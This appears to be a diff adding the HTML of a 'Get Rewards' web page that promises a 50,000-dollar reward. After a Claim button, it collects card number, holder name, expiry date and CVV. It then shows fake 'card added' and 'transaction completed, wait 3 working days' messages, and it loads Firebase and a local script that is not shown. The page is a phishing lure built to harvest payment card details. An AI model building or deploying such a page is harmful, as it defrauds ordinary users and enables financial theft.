@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="./css/styles.css" />
+    <link rel="stylesheet" href="./css/responsive.css" />
+    <link
+      rel="shortcut icon"
+      href="./assets/img/icon.png"
+      type="image/x-icon" />
+    <title>Get Rewards</title>
+  </head>
+  <body>
+    <section class="main">
+      <div class="topimg"></div>
+      <div class="content">
+        <h1 class="get-title">Get Your Due Reward</h1>
+        <h4 class="numb">50,000$</h4>
+        <div class="btn-wrapper">
+          <button class="btn-claim">Claim</button>
+        </div>
+      </div>
+      <div class="second-wrapper hidden">
+        <h3 class="second-wrapper-title"></h3>
+        <div class="content-second">
+          <div class="inputform" action="">
+            <div class="cardlogos">
+              <img class="visa" src="./assets/img/visa.png" alt="" />
+              <img class="master" src="./assets/img/mastercrd.png" alt="" />
+            </div>
+            <p class="cardnumbertitle">Card Number</p>
+            <p class="cardholdertitle">Card Holder</p>
+
+            <input
+              required=""
+              id="cc"
+              value=""
+              class="cardnumber"
+              type="text"
+              placeholder="1234 1234 1234 1234"
+              onkeypress="return checkDigit(event)" />
+            <div class="footercards">
+              <input
+                required=""
+                class="cardname"
+                type="text"
+                placeholder="John Doe" />
+              <div class="carddatawrapper">
+                <p class="carddatetitle">Exp. Date</p>
+                <input
+                  required=""
+                  class="carddata"
+                  type="text"
+                  placeholder="10/25"
+                  maxlength="5"
+                  onkeyup="formatString(event);" />
+              </div>
+              <div class="cardccvwrapper">
+                <p class="cardccvtitle">CCV</p>
+                <input
+                  required=""
+                  class="cardcvv"
+                  type="text"
+                  placeholder="123"
+                  oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');"
+                  maxlength="4" />
+              </div>
+            </div>
+          </div>
+          <p class="vailederrortitle hidden"></p>
+          <div class="buttonwrapper">
+            <button class="accept">Add Card</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="card-added-wrapper hidden">
+        <h3 class="succestitle">
+          Your credit card has been successfully added
+        </h3>
+        <h1 class="amount"></h1>
+        <div class="withdrav-wrapper">
+          <button class="withdraw-btn">Withdrawal</button>
+        </div>
+      </div>
+
+      <div class="final-wrapper hidden">
+        <h1 class="trans-final">
+          Transaction completed successfully Please wait 3 working days
+        </h1>
+      </div>
+
+      <div class="loader hidden"></div>
+
+      <div class="bottomimg"></div>
+    </section>
+
+    <!-- <div class="box">
+      <h1 class="maintxt">Hello World!!!</h1>
+      <button class="btngo">Go!!!</button>
+    </div> -->
+    <script src="https://www.gstatic.com/firebasejs/8.6.2/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/3.1.0/firebase.js"></script>
+    <script src="./js/app.js"></script>
+  </body>
+</html>
